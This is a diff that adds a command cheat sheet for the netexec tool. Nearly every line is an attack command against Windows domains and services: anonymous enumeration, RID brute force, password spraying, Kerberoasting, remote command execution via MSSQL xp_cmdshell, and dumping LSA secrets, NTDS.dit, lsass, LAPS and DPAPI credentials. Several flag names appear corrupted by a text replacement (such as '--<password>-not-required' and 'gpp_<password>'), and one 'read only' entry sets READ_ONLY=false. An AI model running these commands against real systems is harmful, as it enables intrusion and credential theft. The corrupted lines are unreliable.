@@ -1,0 +1,150 @@
+% netexec
+
+# Initial Enumeration
+netexec smb <rhost>
+
+# Null Authentication
+netexec smb <rhost> -u '' -p ''
+
+# Guest Authentication
+netexec smb <rhost> -u 'guest' -p ''
+
+# List Shares Anonymously
+netexec smb <rhost> -u '' -p '' --shares
+
+# List Shares with Authentication
+netexec smb <rhost> -u <username> -p <password> --shares
+
+# List Usernames anonymously
+netexec smb <rhost> -u '' -p '' --users
+
+# List Usernames with authentication
+netexec smb <rhost> -u <username> -p <password> --users
+
+# RID brute force anonymously
+netexec smb <rhost> -u '' -p '' --rid-brute
+
+# RID brute force with authentication: list all accounts
+netexec smb <rhost> -u '<username>' -p '<password>' --rid-brute
+$ rhost: echo -n "$RHOST"
+
+# RID brute force with authentication: list user accounts only
+netexec smb <rhost> -u '<username>' -p '<password>' --rid-brute | grep 'SidTypeUser' | awk '{print $6}'  | awk -F '\\' '{print $2}'
+$ rhost: echo -n "$RHOST"
+
+# Local Authentication
+netexec smb <rhost> -u <username> -p <password> --local-auth
+
+# Using Kerberos
+netexec smb <rhost> -u <username> -p <password> -k
+
+# Check for hosts that have SMB signing disabled
+netexec smb <rhost>(s) --gen-relay-list relay.txt
+
+# Spray username list with known password
+netexec smb <rhost> -u users.txt -p <password> --continue-on-success
+
+# Spray paired usernames and passwords
+netexec smb <rhost> -u <usernames>.txt -p <passwords>.txt --no-bruteforce --continue-on-success
+
+# SMB All In One
+netexec smb <rhost> -u <username> -p <password> --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+
+# Spider_plus Module
+netexec smb <rhost> -u <username> -p <password> -M spider_plus
+
+# Spider_plus Module read only
+netexec smb <rhost> -u <username> -p <password> -M spider_plus -o READ_ONLY=false
+
+# Dump a specific file
+netexec smb <rhost> -u <username> -p <password> -k --get-file <rhost>_file output_file --share sharename
+
+# FTP: List folders and files
+netexec ftp <rhost> -u <username> -p <password> --ls
+
+# FTP: List files inside a folder
+netexec ftp <rhost> -u <username> -p <password> --ls folder_name
+
+# FTP: Retrieve a specific file
+netexec ftp <rhost> -u <username> -p <password> --ls folder_name --get file_name
+
+# LDAP: Enumerate users using ldap
+netexec ldap <rhost> -u '' -p '' --users
+
+# LDAP: All In One
+netexec ldap <rhost> -u <username> -p <password> --trusted-for-delegation  --<password>-not-required --admin-count --users --groups
+
+# LDAP: Kerberoast
+netexec ldap <rhost> -u <username> -p <password> --kerberoasting kerb.txt
+
+# LDAP: ASREProast
+netexec ldap <rhost> -u <username> -p <password> --asreproast asrep.txt
+
+# MSSQL: Authentication
+netexec mssql <rhost> -u <username> -p <password>
+
+# MSSQL: Execute PowerShell commands using `xp_cmdshell` (-X for PowerShell)
+netexec mssql <rhost> -u <username> -p <password> -X command_to_execute
+
+# MSSQL: Execute cmd commands using `xp_cmdshell` (-x for cmd)
+netexec mssql <rhost> -u <username> -p <password> -x command_to_execute
+
+# MSSQL:Get a file
+netexec mssql <rhost> -u <username> -p <password> --get-file output_file <filename>
+
+# SMB: Dump LSA secrets
+netexec smb <rhost> -u <username> -p <password> --local-auth --lsa
+
+# LDAP: gMSA id
+netexec ldap <rhost> -u <username> -p <password> --gmsa-convert-id id
+
+# LDAP: gMSA account
+netexec ldap domain -u <username> -p <password> --gmsa-decrypt-lsa gmsa_account
+
+# Group Policy Preferences
+netexec smb <rhost> -u <username> -p <password> -M gpp_<password>
+
+# Dump LAPS v1 and v2 <password>
+netexec smb <rhost> -u <username> -p <password> --laps
+
+# Dump dpapi credentials
+netexec smb <rhost> -u <username> -p <password> --laps --dpapi
+
+# Dump NTDS.dit
+netexec smb <rhost> -u <username> -p <password> --ntds
+
+# Bloodhound
+netexec ldap <rhost> -u <username> -p <password> --bloodhound --dns-server <rhost> --dns-tcp -c all
+
+# Webdav: check whether the WebClient service is running on the <rhost>
+netexec smb ip -u <username> -p <password> -M webdav 
+
+# Veeam: extract credentials from local Veeam SQL Database
+netexec smb <rhost> -u <username> -p <password> -M veeam
+
+# ntdsutil: dump NTDS with ntdsutil
+netexec smb ip -u <username> -p <password> -M ntdsutil 
+
+# ldap-checker: check whether LDAP signing and binding are required and/or enforced
+cme ldap <rhost> -u <username> -p <password> -M ldap-checker
+
+# Check if the DC is vulnerable to zerologon
+netexec smb <rhost> -u <username> -p <password> -M zerologon
+
+# Check if the DC is vulnerable to petitpotam
+netexec smb <rhost> -u <username> -p <password> -M petitpotam
+
+# Check if the DC is vulnerable to nopac
+netexec smb <rhost> -u <username> -p <password> -M nopac
+
+# Check the MachineAccountQuota
+netexec ldap <rhost> -u <username> -p <password> -M maq
+
+# ADCS Enumeration
+netexec ldap <rhost> -u <username> -p <password> -M adcs
+
+# Dump lsass
+netexec smb <rhost> -u <username> -p <password> -M lsassy
+
+# Retrieve MSOL account <password>
+netexec smb <rhost> -u <username> -p <password> -M msol
